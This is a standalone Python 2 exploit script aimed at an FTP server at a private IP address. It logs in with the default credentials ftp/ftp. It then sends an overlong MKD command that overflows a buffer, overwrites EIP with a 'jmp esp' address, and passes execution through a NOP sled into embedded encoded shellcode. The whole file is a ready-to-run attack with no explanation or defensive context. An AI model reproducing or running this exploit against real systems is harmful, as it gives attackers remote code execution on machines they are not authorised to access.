#!/usr/bin/python
from socket import *
import time
import sys

# Vars
host = "192.168.178.24"
port = 21
user = "ftp"
password = "ftp"
multiplier = 667
# jmp esp = "76 26 11 B3" , little endian = "B3 11 26 76"
EIP = "\xB3\x11\x26\x76"

buf =  ""
buf += "\x6a\x18\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\x6b\x7d\xd8\x1a\x83\xeb\xfc\xe2\xf4\x97\x4c\x03\x7e"
buf += "\xe0\x3e\xe8\x91\x2b\x71\x53\x4a\x77\xf6\xca\x91\x19"
buf += "\x5d\x75\xb7\x25\x7e\xde\x27\x59\x4e\x87\x28\x1e\x92"
buf += "\x53\x70\x63\xf6\x9d\x26\xe0\x31\xdd\x62\xe0\x31\xd5"
buf += "\x06\x6a\x94\x53\x5b\x33\x7c\x30\x91\x1a\x41\xd9\xf4"
buf += "\x68\x14\xd4\x49\x01\x7c\xb2\x18\x94\xad\x4f\x72\xab"
buf += "\xd5\x6a\x0f\x03\x7f\xd8\x0b\x37\xf4\x39\x49\xdc\x71"
buf += "\x8b\x4b\x3c\x2c\xb2\x0a\x3a\x2a\x8e\xe5\x8e\x7d\xd8"
buf += "\x1a"

shellcode = buf

# Socket 
s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

# Login
s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

print "[*] sending %s bytes of data" % multiplier
content = "MKD "
content += "\n" * 667
content += "A" * 27
content += EIP
content += "\x90" * 31
content += shellcode
content += "\r\n"
s.send(content)
s.recv(1024)
